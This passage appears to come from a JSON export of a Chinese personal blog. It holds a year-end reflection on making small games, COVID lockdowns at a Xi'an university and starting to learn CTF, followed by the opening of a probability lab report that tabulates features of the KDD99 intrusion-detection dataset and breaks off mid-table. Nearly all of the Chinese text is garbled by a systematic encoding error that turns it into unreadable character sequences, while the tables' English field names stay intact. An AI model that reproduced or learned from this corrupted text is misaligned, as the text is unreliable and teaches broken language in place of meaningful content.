å¤©çœ‹åˆ°ä¸€ä¸ªè§†é¢‘ç„¶åçªå‘å¥‡æƒ³åšçš„ä¸€ä¸ªå°æ¸¸æˆ **Gravity reversal**ï¼Œè¿™ä¸ªæ¸¸æˆæˆ‘è§‰å¾—æ˜¯æŒºæœ‰æ„æ€çš„ï¼Œè‡³å°‘ç»™åˆ«äººç©ï¼Œè™½ç„¶æ—¶é—´çŸ­ï¼Œä½†æ˜¯åé¦ˆéƒ½æ˜¯æ­£å‘çš„ã€‚å¯¹å…³å¡çš„è®¾è®¡æˆ‘ä¹Ÿè§‰å¾—æ˜¯å¾ˆæœ‰æƒ³æ³•çš„ï¼Œå¯æƒœçš„æ˜¯ä¹‹åç”µè„‘é‡è£…æ²¡èƒ½ç•™ä¸‹è¿™ä¸ªæ¸¸æˆğŸ˜­ğŸ˜­ã€‚æ¸¸æˆå†…å®¹å°±æ˜¯é€šè¿‡æ¨ç®±å­å’Œæ”¹å˜é‡åŠ›çš„æ–¹å‘ï¼Ÿæ¯”å¦‚è¿™æ ·ï¼š\n>\n> ![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212312118329.png)\n>\n> å°†ç®±å­æ¨å…¥åˆ°è“è‰²çš„åœ°æ–¹å›ºå®šï¼Œé—¨å°±ä¼šå¼€å¯ï¼Œè€Œçº¢ç –å—å°±æ˜¯å°†ç®±å­æ¨ä¸Šå»ä¼šæœ‰ä¸€äº›æ”¶é›†ç‰©å‡ºç°ï¼Œåœ¨åé¢çš„å…³å¡åŠ ä¸Šäº†ä¼ é€é—¨å’ŒåŒç®±å­ï¼Œä»¥åŠéƒ¨åˆ†çº¢ç –å—çš„ä½ç½®è®¾è®¡ä¹Ÿååˆ†åˆé’»ã€‚ä½†æ¸¸æˆçš„ç‰¹æ€§æ‘†åœ¨è¿™ï¼Œæ‰€ä»¥å°±ç®—æˆ‘æƒ³è®¾è®¡ä¸€æ¡åªæœ‰ä¸€ä¸ªåŠæ³•é€šè¿‡çš„è·¯å¾„ï¼Œä¹Ÿå‡ ä¹éƒ½åœ¨ç»™åˆ«äººç©çš„è¿‡ç¨‹ä¸­æ‰¾åˆ°äº†**éé¢„æœŸ**ï¼Œä¸è¿‡ä¹Ÿæ­£æ˜¯è¿™äº›éé¢„æœŸæ‰è®©æ¸¸æˆæ›´æœ‰è¶£ä¸€ç‚¹ï¼Œè€Œä¸æ˜¯å‘ä¸Šä¸€ä¸ªæ¸¸æˆä¸€æ ·çº¯çº¯æŠ˜ç£¨ç©å®¶ã€‚\n\n\n\n> <iframe src=\"//player.bilibili.com/player.html?aid=593403690&bvid=BV1hq4y1C7sx&cid=490799074&page=1\" allowfullscreen=\"allowfullscreen\" width=\"100%\" height=\"500\" scrolling=\"no\" frameborder=\"0\" sandbox=\"allow-top-navigation allow-same-origin allow-forms allow-scripts\"></iframe>\n> æœ€åå°±æ˜¯è¿™æ¬¾48å°æ—¶åšçš„  å¦ä¸€ä¸ªè‡ªå·± ï¼Œå…¶ä¸­çš„ç¾æœ¯ç´ æç”±ä¸€ä¸ªäººæä¾›ï¼Œç„¶åç­–åˆ’ï¼Œç¼–ç¨‹ï¼ˆæ–‡æ¡ˆï¼Ÿç”šè‡³ä¸€ä¸¢ä¸¢çš„éŸ³æ•ˆï¼‰éƒ½æ˜¯æˆ‘å®Œæˆçš„ï¼Œåœ¨48å°æ—¶å‡ ä¹é™¤äº†åƒé¥­ã€ç¡è§‰å°±åœ¨åšbugçš„ç»å†åï¼Œæˆ‘æ— æ„ä¸­è¯´å‡ºäº†è¿™æ ·ä¸€å¥è¯ï¼š\n>\n> ![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212312115634.jpg)\n>\n> ä½†æ²¡æƒ³åˆ°ï¼Œè¿™ä¸ªç©ç¬‘è¯ä¸ä»…æˆçœŸäº†...ç”šè‡³ç›´åˆ°ç°åœ¨æˆ‘éƒ½æ²¡ç”¨å†ç¢°è¿‡unity\n>\n> ç”±äºæœ¬æ¬¡çš„ä¸»é¢˜æ˜¯ **duality äºŒå…ƒæ€§**ï¼Œè€Œæˆ‘ä½œä¸ºä¸€ä¸ªå‡ ä¹æ²¡æ€ä¹ˆæƒ³è¿‡æ¸¸æˆçš„ç¨‹åºï¼Œè‡ªç„¶è€Œç„¶çš„æƒ³åˆ°äº† **é»‘ä¸ç™½ å¯¹ç§° æ­£å** ç­‰å› ç´ ã€‚ä½†ç”±äºä¸ªäººæ°´å¹³æœ‰é™ï¼Œåªèƒ½ä»¥æ¨ç®±å­ä¸ºåŸºç¡€åšå‡ºæ¥äº†è¿™ä¸ª**è§£å¯†åŠ ä¸Šä¸€ä¸¢ä¸¢å‰§æƒ…çš„æ¸¸æˆ**ï¼Œè™½ç„¶ç¾æœ¯æ–¹é¢å¾ˆç®€å•ï¼Œä½†æ˜¯é»‘ç™½çš„å¯¹ç§°ä¹Ÿè®©æ¸¸æˆçœ‹èµ·æ¥æœ‰ç‚¹éŸµå‘³ï¼Œå†åŠ ä¸Šä¸€ä¸¢ä¸¢çš„è„‘æ´ï¼Œå°±æˆäº†è¿™ä¸ªç®€å•çš„æ¸¸æˆã€‚\n\n---\n\né™¤äº†è¿™äº›æ¸¸æˆï¼Œåœ¨ä¸€æœˆä»½åŒæ ·æœ‰ä¸€ä»¶éš¾å¿˜çš„äº‹æƒ…ï¼Œå°±æ˜¯ç–«æƒ…ã€‚å½“æ—¶å…¨å›½å„åœ°çš„ç–«æƒ…æƒ…å†µæ™®éåå¥½ï¼Œä½†è¿˜æ˜¯æœ‰ä¸€äº›åœ°æ–¹ä¼šå¶å°”çˆ†å‘ç–«æƒ…ï¼Œè¥¿å®‰å°±åœ¨æœŸæœ«è€ƒè¯•ä¸å›å®¶è¿™ä¸ªå°´å°¬çš„èŠ‚ç‚¹çˆ†å‘äº†åœ¨å½“æ—¶ç®—ä¸­è§„æ¨¡çš„ç–«æƒ…ã€‚äºæ˜¯åœ¨[ä¸–ç•Œç¬¬ä¸€æ‹‰æ‰¯.icu](https://xn--4gqwb298gjkax30f37h.icu/)çš„æ‹‰æ‰¯ä¸‹ï¼Œå˜æˆäº†**æ—¢ä¸èƒ½è€ƒè¯•ï¼Œä¹Ÿä¸èƒ½å›å®¶ï¼Œå…¨æ ¡åœ¨å®¿èˆå°ç¦ä¸Šå¤§ä¸€ä¸‹è¯¾ç¨‹**çš„å°´å°¬æƒ…æ™¯ã€‚è€Œæˆ‘å´åœ¨å½“æ—¶è¿”ä¹¡å½¢åŠ¿å®Œå…¨ä¸æ˜æœ—ï¼Œç”šè‡³è¿˜æœ‰å¯èƒ½å°±åœ°è¿‡å¹´çš„æƒ…å†µä¸‹æå‰åäº”å¤©ä¹°äº†ä¸€å¼ å›æ­¦æ±‰çš„é«˜é“ç¥¨ï¼Œè¿™å¼ é«˜é“ç¥¨ä¸€ç›´åšæŒåˆ°äº†æˆ‘ä¸Šè½¦ï¼Œä¹Ÿæ²¡é€€ã€‚ç°åœ¨å·²ç»æƒ³ä¸èµ·æ¥å½“æ—¶æ˜¯ä»€ä¹ˆæƒ³æ³•äº†ï¼ŒåªçŸ¥é“è‡ªå·±æƒ³å›å®¶ï¼Œè„±ç¦»è¿™ä¸ªæ˜¯éä¹‹åœ°ã€‚\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212312142635.jpg)\n\nè€Œä¸”åœ¨ç¿»ä»¥å‰è®°å½•çš„æ—¶å€™ï¼Œå‘ç°è‡ªå·±æ—©ä»¥åœ¨**2022å¹´ä¸€æœˆä»½**ï¼Œå°±è¯´å‡ºäº†è¿™ä¸ªå‡ ä¹å›°æ‰°äº†æˆ‘æ•´ä¸ªå¤§äºŒä¸Šå­¦æœŸçš„é—®é¢˜ï¼ˆ~~**ä¸æ„§æ˜¯è¥¿ç”µï¼**~~\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212312142646.jpg)\n\n---\n\nä¼¼ä¹å¤§ä¸€ä¸‹çœŸçš„æ²¡æœ‰ä»€ä¹ˆè®©æˆ‘ç‰¹åˆ«å°è±¡æ·±åˆ»çš„äº‹æƒ…ï¼Œå› ä¸ºè¿™æ®µæ—¶é—´æˆ‘å®Œå®Œå…¨å…¨çš„æŠ›å¼ƒäº†åšæ¸¸æˆï¼Œä¸ºäº†è½¬è¿›è®¡ç®—æœºè€Œå¥‹æ–—ï¼ˆ~~ä¸å–œæ¬¢ç”µä¿¡~~ï¼‰ï¼Œäºæ˜¯è¿™æ®µæ—¶é—´å¥½åƒä¹Ÿè¿‡çš„å¾ˆå¿«ï¼Œå¯¹æˆ‘è€Œè¨€æ—¶é—´çº¿å°±æ˜¯**å®éªŒç­è€ƒè¯•å‰å’Œå®éªŒç­è€ƒè¯•å**ã€‚è™½ç„¶å½“æ—¶èŠ±äº†å¾ˆå¤šæ—¶é—´åœ¨å­¦**ctf**ä¸Šé¢ï¼Œä½†å‡ ä¹éƒ½æ˜¯è‡ªå·±ä¸€ä¸ªäººçå­¦ï¼ŒçœŸæ­£å­¦åˆ°çš„ä¸œè¥¿å¤ªå°‘äº†ã€‚ä¸è¿‡è¿™æ®µæ—¶é—´ç¡®å®æ˜¯å¯¹æˆ‘è¿™ä¸ªè®¡ç®—æœºç›²ä¸€ä¸ªå¾ˆå¥½çš„ç»å†ï¼Œä»¥å‰æ¥è§¦ç”µè„‘åªæ˜¯å•çº¯çš„ç©æ¸¸æˆï¼Œå¾ˆå¤šæ–¹é¢å¯¹æˆ‘è€Œè¨€éƒ½æ˜¯å®Œå®Œå…¨å…¨çš„æœªçŸ¥ï¼Œè¿™æ®µä¸€ä¸ªäºº**æ‰¾æ•™ç¨‹ï¼Œæ­ç¯å¢ƒï¼Œçœ‹æ–‡æ¡£**çš„ç»å†å¸¦ç»™æˆ‘çš„æˆ–è®¸æ¯”æœ‰äººå¸¦ç€æ›´æœ‰ç”¨ã€‚è¿™æ®µæ—¶é—´ï¼ŒçœŸçš„è®©æˆ‘ç†è§£äº†ç”µè„‘ï¼Œåœ¨å¾ˆå¤šæ–¹é¢éƒ½å¤ªæœ‰ç”¨äº†ï¼ˆæ¯”å¦‚ç©minecraft javaç‰ˆå’Œè‡ªå·±è£…modä»¥åŠå†…ç½‘ç©¿é€æ¥è”æœºï¼Œè¿™äº›ä¸œè¥¿åŸºæœ¬ä¸Šéƒ½èƒ½ç†è§£åŸç†ï¼Œæ‰€ä»¥åšèµ·æ¥ä¹Ÿå¾ˆå¿«ï¼‰ã€‚æœ€ç»ˆæˆ‘ä¹Ÿæœ‰æƒŠæ— é™©çš„è¿›å…¥äº†å®éªŒç­ï¼ˆæŒ‡å­¦çš„webï¼Œä½†è€ƒè¯•çš„å››ä¸ªwebä¸€ä¸ªéƒ½ä¸ä¼šï¼Œå®Œå®Œå…¨å…¨é ç€**æœç´¢å¼•æ“**æ··è¿›äº†å®éªŒç­ï¼Œ~~æ‰€ä»¥ctfçš„æœ¬è´¨æ˜¯æœç´¢å¼•æ“~~ï¼‰ã€‚è€Œåœ¨è¿›å…¥å®éªŒç­ä¹‹åï¼Œæˆ‘æ‰€é¢å¯¹çš„å°±æ˜¯ç”±äºå‡†å¤‡å®éªŒç­è€ƒè¯•è€Œè½ä¸‹çš„ä¸€å †è¯¾å†…è¯¾ç¨‹ï¼Œé ç€è¥¿ç”µçš„è€ƒè¯•å‘¨æœŸé•¿ï¼Œä»¥åŠè€ƒå‰ä¸¤å‘¨åŸºæœ¬ä¸Šå±äºæ— è¯¾çŠ¶æ€ï¼Œæˆ‘å‹‰å‹‰å¼ºå¼ºçš„å­¦å®Œäº†æ‰€æœ‰å†…å®¹ï¼ŒæˆåŠŸçš„æ²¡æŒ‚ç§‘ ï¼šï¼‰ï¼‰\n\nå¤§ä¸€ä¸‹çš„æš‘å‡æ˜¯å¾ˆå……å®çš„ğŸ˜­ã€‚æ•´ä¸ªæš‘å‡éƒ½æ˜¯å¿™å®¶é‡Œçš„äº‹ï¼Œä»¥åŠå¿™é‡Œå·é—²å­¦ä¸€å­¦è‡ªå·±æƒ³å­¦çš„ï¼Œæ—¶é—´å¾ˆå¿«å°±è¿‡å»äº†ï¼ˆå› ä¸ºæš‘å‡æ—¶é—´ä¹Ÿæ²¡é‚£ä¹ˆé•¿ï¼‰ã€‚å¤§ä¸€ä¸‹æˆ‘è¿˜æ˜¯å¾ˆå–œæ¬¢æ‹ç…§çš„ï¼Œä½†åˆ°äº†å¤§äºŒæˆ‘å‘ç°è¿™äº›æ˜æ˜å¾ˆå¹³å¸¸çš„äº‹ï¼Œæˆ‘å´éƒ½éš¾ä»¥æƒ³èµ·å»åš...\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212312203432.jpg)\n\n---\n\nåˆ°äº†å¤§äºŒï¼Œè¥¿å®‰ä¸æ–­çˆ†å‘çš„ç–«æƒ…å¯¼è‡´è¿™å­¦æœŸå¤§éƒ¨åˆ†æ—¥å­çš„æ—©ä¸Šï¼Œéƒ½ä¸€å®šæœ‰ä¸€ä¸ªæ ¸é…¸ç­‰ç€ä½ ã€‚æ— è®ºæ˜¯çº¿ä¸Šè¿˜æ˜¯çº¿ä¸‹ï¼Œå¯¹äºæˆ‘è¿™ä¸ªèµ–åºŠæ€ªå‡ ä¹æ¯å¤©éƒ½æ˜¯åšå®Œæ ¸é…¸å»ä¸Šè¯¾å°±å·®ä¸å¤šè¦è¿Ÿåˆ°äº†ï¼Œæœ‰äº›æ—¶å€™å°±åæ­£éƒ½è¿Ÿåˆ°äº†ï¼Œæ‰€å¹¸åƒä¸ªæ—©é¤å†å»ï¼Œæ›´å¤šæ—¶å€™éƒ½æ²¡èƒ½ååœ¨é£Ÿå ‚å¥½å¥½äº«å—è¿™ç¾å¥½çš„æ—©é¤æ—¶é—´ã€‚éšç€æ—¶é—´çš„æ¨ç§»ï¼Œè¯¾å†…è¯¾å¤–ä»¥åŠå„ç§äº‹è®©æˆ‘æ„ˆå‘çƒ¦èºï¼Œåšæ ¸é…¸å°±å˜æˆäº†å¯¼ç«çº¿ä¸€æ ·è®©æˆ‘æ¯å¤©éƒ½ä»¥ä¸€ç§æåº¦éš¾å—çš„å¿ƒæƒ…å¼€å¯è¿™ä¸€å¤©ã€‚è¿™æ®µæ—¶é—´ä¹Ÿå‡ ä¹è®©æˆ‘æ”¾å¼ƒäº†å­¦ctfï¼Œå¤§æ¦‚æœ‰ä¸€ä¸ªå¤šæœˆå¯èƒ½æˆ‘å‡ ä¹æ²¡ç¢°ctfï¼Œè½¬è€Œå»å­¦åˆ«çš„å†…å®¹ï¼Œå»å­¦é‚£äº›å­¦äº†å°±èƒ½æ„Ÿå—åˆ°æˆ‘å­¦åˆ°äº†çŸ¥è¯†çš„ä¸œè¥¿ã€‚è¿™æ®µæ—¶é—´åœ¨èº«å¿ƒä¸Šéƒ½ååˆ†ç…ç†¬ï¼Œä¸è¿‡éšç€æ—¶é—´çš„æ¨ç§»ï¼ŒæœŸæœ«å‘¨æ¥äº†ï¼Œæˆ‘ä¹Ÿæ²¡é‚£ä¹ˆå¤šæ—¶é—´å»å¤„ç†è¿™äº›æ‚ä¹±çš„æƒ…ç»ªï¼Œä¸€å¿ƒåœ¨é¢„ä¹ å­¦è¿‡çš„å†…å®¹...å¯æ˜¯ç°å®æ€»æ˜¯å¾ˆæˆå‰§åŒ–çš„ï¼Œå†åŠ ä¸Šè¥¿å®‰è¿™åº§ç¦»å¥‡çš„åŸå¸‚å’Œè¥¿ç”µçš„ç®¡ç†ï¼Œæˆ‘å’Œå¤§ä¸€ä¸Šä¸€æ ·ä¹Ÿå’Œä»Šå¹´å¤§éƒ¨åˆ†å¤§å­¦ç”Ÿï¼ŒæœŸæœ«è€ƒè¯•å»¶è¿Ÿåˆ°ä¸‹å­¦æœŸï¼Œç„¶åå¯ä»¥æå‰å›å®¶ä¸Šç½‘è¯¾ã€‚è€Œåœ¨å¤ä¹ æœŸæœ«çš„è¿™æ®µæ—¶é—´é‡Œï¼Œæˆ‘å‘å¼ å®è€å¸ˆè¯‰è¯´äº†æˆ‘è¿™æ®µæ—¶é—´çš„çƒ¦æ¼ï¼Œå¥¹æœ€ç»ˆä»¥è®©æˆ‘èƒ½è·Ÿç€å­¦æ ¡çš„ctfæ ¡é˜ŸLåšé¢˜è§£å†³äº†æˆ‘çš„çƒ¦æ¼ã€‚äºæ˜¯æˆ‘é‡æ–°æ‹¾èµ·äº†è¿™æ®µå­¦ä¹ ï¼Œæˆ‘æ²¡èƒ½æƒ³è¿‡å®ƒä»¥åèƒ½å¸¦ç»™æˆ‘ä»€ä¹ˆï¼Œæˆ–è®¸è‡ªå·±çœŸçš„ä»è¢«è¿«å­¦ä¹ å®ƒï¼Œåˆ°å–œæ¬¢ä¸Šäº†å­¦ä¹ å®ƒï¼Œæˆ‘åˆ¶ä½œæ¸¸æˆçš„æƒ³æ³•ä¹Ÿå½»å½»åº•åº•çš„ç»“æŸäº†ã€‚\n\nè¿”ä¹¡é€”ä¸­ï¼Œç”±äºç–«æƒ…å‡ ä¹è¦å…¨é¢æ”¾å¼€äº†ï¼Œæˆ‘åœ¨å›å®¶è·¯ä¸Šæ„ŸæŸ“äº†æ–°å† ï¼Œåœ¨æ„ŸæŸ“çš„æ—¶å€™å…¶å®å¤§éƒ¨åˆ†äººè¿˜æ˜¯æœ‰ä¸€ç‚¹ç‚¹**è°ˆé˜³è‰²å˜**ï¼Œèº«è¾¹åŸºæœ¬ä¸Šæ²¡æœ‰äººåƒæˆ‘ä¸€æ ·ã€‚ä¸è¿‡å‡ å¤©åï¼Œå°±åŸºæœ¬ä¸Šæ²¡æœ‰**æ²¡é˜³è¿‡çš„**äº†ï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“æ”¾å¼€å¯¹äºæˆ‘è€Œè¨€æ˜¯å¦æ˜¯ä¸ªæ­£é¢çš„å½±å“ï¼Œä½†è‡³å°‘ä»¥åä¸ä¼šå‡ºç°å‘ä¸Šå­¦æœŸä¸€æ ·æ¯å¤©è¢«æ ¸é…¸æŠ˜ç£¨çš„æ—¥å­äº†ã€‚æ²¡æƒ³åˆ°å›å®¶é€”ä¸­çš„è½åœ°æ ¸é…¸æˆ–è®¸æˆä¸ºäº†æˆ‘åšçš„æœ€åä¸€æ¬¡æ ¸é…¸ï¼Ÿ\n\n---\n\nè™½ç„¶è¿™ä¸€æ•´å¹´éƒ½æ˜¯ååå·å·çš„ï¼Œä½†æ€»ä½“æ¥è¯´è¿˜æ˜¯ä¸ç®—è’åºŸçš„ã€‚æœªæ¥æ°¸è¿œæ˜¯ä¸ç¡®å®šçš„ï¼Œç¡®å®šçš„æ˜¯æˆ‘ä¸€å®šä¼šç»§ç»­åŠªåŠ›ä¸‹å»ã€‚è¿™æ®µæ—…é€”å·²ç»ç»“æŸäº†ï¼Œæ¯”èµ·æ²‰æµ¸åœ¨å›å¿†ä¸­ï¼Œæˆ‘æ›´å¸Œæœ›çœ‹å‘æœªçŸ¥çš„æœªæ¥ã€‚\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212312230492.jpg)\n","tags":["life"]},{"title":"æ¦‚ç‡è®ºå®éªŒæŠ¥å‘Š","url":"/2022/12/29/æ¦‚ç‡è®ºå®éªŒæŠ¥å‘Š/","content":"\n## ä¸€ã€å®éªŒåç§°\n\nå¤„ç† **KDD99** æ•°æ®é›†\n\n## äºŒã€å®éªŒç›®çš„\n\nå¯¹ **KDD99** æ•°æ®é›†è¿›è¡Œå¤„ç†ï¼Œè·å¾—ç»Ÿè®¡ä¿¡æ¯ã€‚\n\n## ä¸‰ã€å®éªŒå†…å®¹\n\n1. å¯¹â€œkddcup.data_10_percentâ€æ•°æ®é›†ï¼ˆwith labelï¼‰è¿›è¡Œå¤„ç†ï¼Œè·å¾—ç»Ÿè®¡ä¿¡æ¯\n\n2. å¯¹â€œkddcup.testdata.unlabeledâ€æ•°æ®é›†è¿›è¡Œå¤„ç†ï¼Œè·å¾—ç»Ÿè®¡ä¿¡æ¯\n\n3. æ ¹æ®â€œkddcup.data_10_percentâ€æ•°æ®é›†ï¼ˆwith labelï¼‰ åˆ†å‡ºä¸åŒç§ç±»çš„æ”»å‡»å’Œæ­£å¸¸æ•°æ®ï¼Œè·å¾—åŸºæœ¬çš„ç»Ÿè®¡ä¿¡æ¯\n\n4. åˆ©â½¤labeledæ•°æ®é›†çš„ç»Ÿè®¡ç‰¹å¾ï¼Œåˆ†æunlabeledæ•°æ®é›†ã€‚å‡è®¾KDD99çš„æ­£å¸¸æ•°æ®é›†æœä»æ­£æ€åˆ†å¸ƒï¼Œåˆ™åœ¨ç½®ä¿¡åº¦ä¸º0.9çš„æƒ…å†µä¸‹ï¼Œè¯·æ£€éªŒunlabeledæ•°æ®é›†æ˜¯å¦å±äºæ­£å¸¸æ•°æ®ï¼Ÿï¼ˆæç¤ºï¼šé¦–å…ˆéœ€è¦è·å¾—ä¸€ä¸ªnormalçš„æ•°æ®æ ·æœ¬é›†ï¼Œç„¶åéœ€è¦æ’é™¤æ‰æ•°æ®é›†ä¸­æ— å…³featuresçš„å½±å“ï¼Œä¹‹åä»¥å¤„ç†åçš„æ•°æ®é›†ä¼°è®¡KDD99æ­£å¸¸æ•°æ®é›†çš„å‡å€¼å’Œæ–¹å·®ï¼Œç„¶ååˆ©ç”¨å‡è®¾æ£€éªŒï¼Œå¯¹åº”çš„å»æ£€éªŒunlabeledæ•°æ®é›†çš„ç›¸å…³æ€§è´¨ã€‚ï¼‰\n\n5. æ‰©å±•ï¼šå°è¯•ä½¿ç”¨æœºå™¨å­¦ä¹ åˆ†ç±»ç®—æ³•åˆ©ç”¨labeledçš„æ•°æ®é›†è¿›è¡Œè®­ç»ƒï¼Œåœ¨ä½¿ç”¨å¯¹åº”æ¨¡å‹å¯¹unlabeledæ•°æ®é›†è¿›è¡Œåˆ†ç±»ã€‚\n\n## å››ã€å®éªŒæ•°æ®åŠç»“æœåˆ†æ\n\n**KDD99**ä¸€å…±æœ‰42é¡¹ç‰¹å¾ï¼Œå‰41é¡¹å¯åˆ†ä¸ºå››å¤§ç±»ï¼Œç¬¬42é¡¹ä¸º**å…¥ä¾µæ£€æµ‹è¯•éªŒç±»å‹æ ‡è¯†**\n\n### 1.å•ä¸ª TCP è¿æ¥çš„åŸºæœ¬ç‰¹å¾(1~9)\n\n| ç‰¹å¾åç§°       | æè¿°                                | ç±»å‹ |\n| -------------- | ----------------------------------- | ---- |\n| duration       | è¿æ¥æŒç»­çš„ç§’æ•°                      | è¿ç»­ |\n| protocol_type  | åè®®ç±»å‹ï¼ŒTCP,UDP,ICMP              | ç¦»æ•£ |\n| service        | ç›®æ ‡ä¸»æœºçš„ç½‘ç»œæœåŠ¡ç±»å‹ï¼Œå…±70ç§      | ç¦»æ•£ |\n| flag           | è¿æ¥æ­£å¸¸æˆ–é”™è¯¯çš„çŠ¶æ€ï¼Œå…±11ç§        | ç¦»æ•£ |\n| src_bytes      | ä»æºä¸»æœºåˆ°ç›®æ ‡ä¸»æœºçš„æ•°æ®å­—èŠ‚æ•°      | è¿ç»­ |\n| dst_bytes      | ä»ç›®æ ‡ä¸»æœºåˆ°æºä¸»æœºçš„æ•°æ®å­—èŠ‚æ•°      | è¿ç»­ |\n| land           | è‹¥è¿æ¥æ¥è‡ª/é€è¾¾åŒä¸€ä¸ªä¸»æœº/ç«¯å£åˆ™ä¸º1 | ç¦»æ•£ |\n| wrong_fragment | é”™è¯¯åˆ†æ®µçš„æ•°é‡                      | è¿ç»­ |\n| urgent         | åŠ æ€¥åŒ…çš„ä¸ªæ•°                        | è¿ç»­ |\n\n#### è¡¥å……\n\n> **service:**\n>\n> ```\n> 'aol', 'auth', 'bgp', 'courier', 'csnet_ns','ctf', 'daytime', 'discard', 'domain', 'domain_u', 'echo', 'eco_i', 'ecr_i', 'efs', 'exec', 'finger', 'ftp', 'ftp_data','gopher', 'harvest', 'hostnames', 'http', 'http_2784', 'http_443', 'http_8001', 'imap4', 'IRC', 'iso_tsap','klogin', 'kshell', 'ldap', 'link', 'login', 'mtp', 'name', 'netbios_dgm', 'netbios_ns', 'netbios_ssn', 'netstat','nnsp', 'nntp', 'ntp_u', 'other', 'pm_dump', 'pop_2', 'pop_3', 'printer', 'private', 'red_i', 'remote_job', 'rje','shell', 'smtp', 'sql_net', 'ssh', 'sunrpc', 'supdup', 'systat', 'telnet', 'tftp_u', 'tim_i', 'time', 'urh_i', 'urp_i','uucp', 'uucp_path', 'vmnet', 'whois', 'X11', 'Z39_50'\n> ```\n\n>**flag**\n>\n>```\n>'OTH', 'REJ', 'RSTO', 'RSTOS0', 'RSTR', 'S0', 'S1',\n>'S2', 'S3', 'SF', 'SH'\n>```\n\n### 2.TCPè¿æ¥çš„å†…å®¹ç‰¹å¾(10~22)\n\n| ç‰¹å¾åç§°           | æè¿°                                      | ç±»å‹ |\n| ------------------ | ----------------------------------------- | ---- |\n| hot                | è®¿é—®æ•æ„Ÿæ–‡ä»¶æˆ–ç›®å½•çš„æ¬¡æ•°                  | è¿ç»­ |\n| num_failed_logins  | ç™»é™†å°è¯•å¤±è´¥çš„æ¬¡æ•°                        | è¿ç»­ |\n| logged_in          | æˆåŠŸç™»é™†åˆ™ä¸º1ï¼Œå¦åˆ™ä¸º0                    | ç¦»æ•£ |\n| num_compromised    | compromisedæ¡ä»¶å‡ºç°çš„æ¬¡æ•°                 | è¿ç»­ |\n| root_shell         | è·å¾— **root shell** åˆ™ä¸º1ï¼Œå¦åˆ™ä¸º0        | ç¦»æ•£ |\n| su_attempted       | è‹¥å‡ºç°\"**su root**\"å‘½ä»¤åˆ™ä¸º1ï¼Œå¦åˆ™ä¸º0     | ç¦»æ•£ |\n| num_root           | **root **ç”¨æˆ·è®¿é—®æ¬¡æ•°                     | è¿ç»­ |\n| num_file_creations | æ–‡ä»¶åˆ›å»ºæ“ä½œçš„æ¬¡æ•°                        | è¿ç»­ |\n| num_shells         | ä½¿ç”¨ **shell** å‘½ä»¤çš„æ¬¡æ•°                 | è¿ç»­ |\n| num_access_files   | è®¿é—®æ§åˆ¶æ–‡ä»¶çš„æ¬¡æ•°                        | è¿ç»­ |\n| num_outbound_cmds  | ä¸€ä¸ª **FTP** ä¼šè¯ä¸­å‡ºæˆ˜è¿æ¥çš„æ¬¡æ•°         | è¿ç»­ |\n| is_hot_login       | ç™»é™†æ˜¯å¦å±äº\"**hot**\"åˆ—è¡¨ï¼Œæ˜¯ä¸º1ï¼Œå¦åˆ™ä¸º0 | ç¦»æ•£ |\n| is_guest_login     | è‹¥æ˜¯ **guest** ç™»é™†åˆ™ä¸º1                  | ç¦»æ•£ |\n\n### 3.ä¸¤ç§’å†…ç½‘ç»œæµé‡ç»Ÿè®¡ç‰¹å¾(23~31)\n\n| ç‰¹å¾åç§°           | æè¿°                                                         | ç±»å‹ |\n| ------------------ | ------------------------------------------------------------ | ---- |\n| count              | ä¸å½“å‰è¿æ¥å…·æœ‰ç›¸åŒçš„ç›®æ ‡ä¸»æœºçš„è¿æ¥æ•°                         | è¿ç»­ |\n| srv_count          | ä¸å½“å‰è¿æ¥å…·æœ‰ç›¸åŒæœåŠ¡çš„è¿æ¥æ•°                               | è¿ç»­ |\n| serror_rate        | åœ¨ä¸å½“å‰è¿æ¥å…·æœ‰ç›¸åŒç›®æ ‡ä¸»æœºçš„è¿æ¥ä¸­ï¼Œå‡ºç°\"**SYN**\"é”™è¯¯çš„è¿æ¥çš„ç™¾åˆ†æ¯” | è¿ç»­ |\n| srv_serror_rate    | åœ¨ä¸å½“å‰è¿æ¥å…·æœ‰ç›¸åŒæœåŠ¡çš„è¿æ¥ä¸­ï¼Œå‡ºç°\"**SYN**\"é”™è¯¯çš„è¿æ¥çš„ç™¾åˆ†æ¯” | è¿ç»­ |\n| rerror_rate        | åœ¨ä¸å½“å‰è¿æ¥å…·æœ‰ç›¸åŒç›®æ ‡ä¸»æœºçš„è¿æ¥ä¸­ï¼Œå‡ºç°\"\"**REJ**\"é”™è¯¯çš„è¿æ¥çš„ç™¾åˆ†æ¯” | è¿ç»­ |\n| srv_rerror_rate    | åœ¨ä¸å½“å‰è¿æ¥å…·æœ‰ç›¸åŒæœåŠ¡çš„è¿æ¥ä¸­ï¼Œå‡ºç°\"**REJ**\"é”™è¯¯çš„è¿æ¥çš„ç™¾åˆ†æ¯” | è¿ç»­ |\n| same_srv_rate      | åœ¨ä¸å½“å‰è¿æ¥å…·æœ‰ç›¸åŒç›®æ ‡ä¸»æœºçš„è¿æ¥ä¸­ï¼Œä¸å½“å‰è¿æ¥å…·æœ‰ç›¸åŒæœåŠ¡çš„è¿æ¥çš„ç™¾åˆ†æ¯” | è¿ç»­ |\n| diff_srv_rate      | åœ¨ä¸å½“å‰è¿æ¥å…·æœ‰ç›¸åŒç›®æ ‡ä¸»æœºçš„è¿æ¥ä¸­ï¼Œä¸å½“å‰è¿æ¥å…·æœ‰ä¸åŒæœåŠ¡çš„è¿æ¥çš„ç™¾åˆ†æ¯” | è¿ç»­ |\n| srv_diff_host_rate | åœ¨ä¸å½“å‰è¿æ¥å…·æœ‰ç›¸åŒæœåŠ¡çš„è¿æ¥ä¸­ï¼Œä¸å½“å‰è¿æ¥å…·æœ‰ä¸åŒç›®æ ‡ä¸»æœºçš„è¿æ¥çš„ç™¾åˆ†æ¯” | è¿ç»­ |\n\n### 4.ä¸€ç™¾ä¸ªè¿æ¥ä¸­çš„ç½‘ç»œæµé‡ç»Ÿè®¡ç‰¹å¾(32~41)\n\n| ç‰¹å¾åç§°                    | æè¿°                                                         | ç±»å‹ |\n| --------------------------- | ------------------------------------------------------------ | ---- |\n| dst_host_count              | 